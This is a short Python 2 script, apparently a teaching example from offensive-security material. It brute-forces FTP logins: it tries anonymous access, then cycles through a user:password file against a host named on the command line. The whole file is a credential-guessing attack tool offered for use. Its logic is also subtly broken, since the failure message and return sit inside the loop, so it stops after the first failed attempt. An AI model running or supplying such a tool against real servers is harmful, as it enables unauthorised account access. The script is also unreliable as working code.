#!/usr/bin/python
import ftplib
import sys

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) + 'FTP Anonymous Logon Successful'
        ftp.quit()
        return True
    except Exception, e:
        print '\n [-] ' + str(hostname) + 'FTP Anonymous Logon Failed'
        return False
def bruteLogin(hostname , passwdFile):
    pF = open(passwdFile , 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passwd = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: " + userName + "/" + passwd
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passwd)
            print '\n[*] ' + str(hostname) +  ' FTP Login Successfult  ' + userName+'/'+passwd
            ftp.quit()
            return (userName,passwd)
        except Exception, e:
            pass

        print '\n[-] Could not brute force FTP credentials. '
        return (None, None)

host = sys.argv[1]
passwdFile = sys.argv[2]
bruteLogin(host, passwdFile)
